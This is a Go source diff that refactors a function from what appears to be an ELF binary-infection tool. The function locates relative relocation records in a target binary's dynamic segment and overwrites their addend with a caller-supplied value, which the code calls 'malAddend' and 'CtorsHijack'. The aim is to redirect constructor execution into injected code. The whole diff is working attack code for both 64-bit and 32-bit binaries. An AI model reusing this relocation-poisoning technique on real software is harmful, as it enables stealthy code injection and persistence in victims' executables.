@@ -9,11 +9,8 @@ import(
 	"fmt"
 )
 
-func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interface{}, debug bool) error {			
-	textNdx := t.impNdx.textNdx
-	if debug {
-		fmt.Println("[+] CtorsHijack requested. Locating and reading Dynamic Segment")
-	}
+func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interface{}, newAddend interface{}) error {			
+	t.printDebugMsg("[+] CtorsHijack requested. Locating and reading Dynamic Segment")
 			
 	if err := t.GetDyn(); err != nil {
 		return err;
@@ -22,25 +19,19 @@ func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interfa
 	if _, ok := relocEntry.(*elf.Rela64); ok {	
 		pHeaders := t.Phdrs.([]elf.Prog64)
 		
-		if debug {
-			fmt.Printf("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn64)))
-		}
+		t.printDebugMsg("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn64)))
 			
 		var dtRelaOffset uint64
 		var dtRelaEntryCount uint64
 
 		for _, dynEntry := range t.Dyn.([]elf.Dyn64) {
 			if elf.DynTag(dynEntry.Tag) == elf.DT_RELA {
-				if debug {
-					fmt.Printf("[+] Located DT_RELA @ 0x%016x\n", dynEntry.Val)
-				}
+				t.printDebugMsg("[+] Located DT_RELA @ 0x%016x\n", dynEntry.Val)
 				dtRelaOffset = dynEntry.Val
 			}
 
 			if elf.DynTag(dynEntry.Tag) == elf.DT_RELAENT {
-				if debug {
-					fmt.Printf("[+] DT_RELA has %d entries\n", dynEntry.Val)
-				}
+				t.printDebugMsg("[+] DT_RELA has %d entries\n", dynEntry.Val)
 				dtRelaEntryCount = dynEntry.Val
 			}
 		}			
@@ -52,9 +43,8 @@ func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interfa
 		var o uint64
 	
 		o = dtRelaOffset
-		if debug {
-			fmt.Printf("[+] File offset of relocations @ 0x%016x\n", o)
-		}
+
+		t.printDebugMsg("[+] File offset of relocations @ 0x%016x\n", o)
 		
 		relaEntrySize := uint64(reflect.TypeOf(*relocEntry.(*elf.Rela64)).Size())		
 		endReloc := o + dtRelaEntryCount * uint64(relaEntrySize)
@@ -76,19 +66,17 @@ func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interfa
 			}
 		}
 
-		if debug {
-			fmt.Println("[+] Found viable relocation record hooking/poisoning")
-			fmt.Printf("\toffset: 0x%016x\n", relocEntry.(*elf.Rela64).Off) 
-			fmt.Printf("\ttype: %s\n", elf.R_X86_64(relocEntry.(*elf.Rela64).Info).String())
-			fmt.Printf("\tAddend: 0x%016x\n", relocEntry.(*elf.Rela64).Addend)
-		}
+		t.printDebugMsg("[+] Found viable relocation record hooking/poisoning")
+		t.printDebugMsg("\toffset: 0x%016x\n", relocEntry.(*elf.Rela64).Off) 
+		t.printDebugMsg("\ttype: %s\n", elf.R_X86_64(relocEntry.(*elf.Rela64).Info).String())
+		t.printDebugMsg("\tAddend: 0x%016x\n", relocEntry.(*elf.Rela64).Addend)
 
 		if elf.R_X86_64(relocEntry.(*elf.Rela64).Info) != elf.R_X86_64_RELATIVE {
 			return errors.New("No R_X86_64_RELATIVE relocation type present for this technique.")
 		}
 			
 		*origAddend.(*int64) = relocEntry.(*elf.Rela64).Addend
-		relocEntry.(*elf.Rela64).Addend = int64(pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz) 
+		relocEntry.(*elf.Rela64).Addend = newAddend.(int64) 
 	
 		relWriter := new(bytes.Buffer)
 		if err := binary.Write(relWriter, t.EIdent.Endianness, relocEntry); err != nil {
@@ -105,33 +93,25 @@ func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interfa
 	
 		binary.LittleEndian.PutUint64(t.Contents[fileOff:], uint64(relocEntry.(*elf.Rela64).Addend))
 
-		if debug {
-			fmt.Printf("[+] offset 0x%016x updated with value (Addend) %016x\n", fileOff, relocEntry.(*elf.Rela64).Addend)
-		}
+		t.printDebugMsg("[+] offset 0x%016x updated with value (Addend) %016x\n", fileOff, relocEntry.(*elf.Rela64).Addend)
 	}
 
 	if _, ok := relocEntry.(*elf.Rel32); ok {
 		pHeaders := t.Phdrs.([]elf.Prog32)
 		
-		if debug {
-			fmt.Printf("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn32)))
-		}
+		t.printDebugMsg("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn32)))
 			
 		var dtRelOffset uint32
 		var dtRelEntryCount uint32
 
 		for _, dynEntry := range t.Dyn.([]elf.Dyn32) {
 			if elf.DynTag(dynEntry.Tag) == elf.DT_REL {
-				if debug {
-					fmt.Printf("[+] Located DT_REL @ 0x%08x\n", dynEntry.Val)
-				}
+				t.printDebugMsg("[+] Located DT_REL @ 0x%08x\n", dynEntry.Val)
 				dtRelOffset = dynEntry.Val
 			}
 
 			if elf.DynTag(dynEntry.Tag) == elf.DT_RELENT {
-				if debug {
-					fmt.Printf("[+] DT_REL has %d entries\n", dynEntry.Val)
-				}
+				t.printDebugMsg("[+] DT_REL has %d entries\n", dynEntry.Val)
 				dtRelEntryCount = dynEntry.Val
 			}
 		}			
@@ -143,9 +123,8 @@ func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interfa
 		var o uint32
 	
 		o = dtRelOffset
-		if debug {
-			fmt.Printf("[+] File offset of relocations @ 0x%08x\n", o)
-		}
+		
+		t.printDebugMsg("[+] File offset of relocations @ 0x%08x\n", o)
 		
 		relEntrySize := uint32(reflect.TypeOf(*relocEntry.(*elf.Rel32)).Size())		
 		endReloc := o + dtRelEntryCount * uint32(relEntrySize)
@@ -166,12 +145,10 @@ func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interfa
 				break
 			}
 		}
-
-		if debug {
-			fmt.Println("[+] Found viable relocation record hooking/poisoning")
-			fmt.Printf("\toffset: 0x%016x\n", relocEntry.(*elf.Rel32).Off) 
-			fmt.Printf("\ttype: %s\n", elf.R_386(relocEntry.(*elf.Rel32).Info).String())
-		}
+			
+		t.printDebugMsg("[+] Found viable relocation record hooking/poisoning")
+		t.printDebugMsg("\toffset: 0x%016x\n", relocEntry.(*elf.Rel32).Off) 
+		t.printDebugMsg("\ttype: %s\n", elf.R_386(relocEntry.(*elf.Rel32).Info).String())
 
 		if elf.R_386(relocEntry.(*elf.Rel32).Info) != elf.R_386_RELATIVE {
 			return errors.New("No R_386_RELATIVE relocation type present for this technique.")
@@ -194,7 +171,7 @@ func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interfa
 		}
 
 		
-		malAddend := int32(pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz)	
+		malAddend := newAddend.(int32)	
 		malBytes := new(bytes.Buffer)
 		
 		if err := binary.Write(malBytes, t.EIdent.Endianness, &malAddend); err != nil {
@@ -203,9 +180,7 @@ func (t *TargetBin) relativeRelocHook(origAddend interface{}, relocEntry interfa
 		
 		copy(t.Contents[fileOff:], malBytes.Bytes())
 		
-		if debug {
-			fmt.Printf("[+] offset 0x%08x updated with value (Addend) 0x%08x\n", fileOff, malAddend)
-		}
+		t.printDebugMsg("[+] offset 0x%08x updated with value (Addend) 0x%08x\n", fileOff, malAddend)
 	}
 	
 	return nil
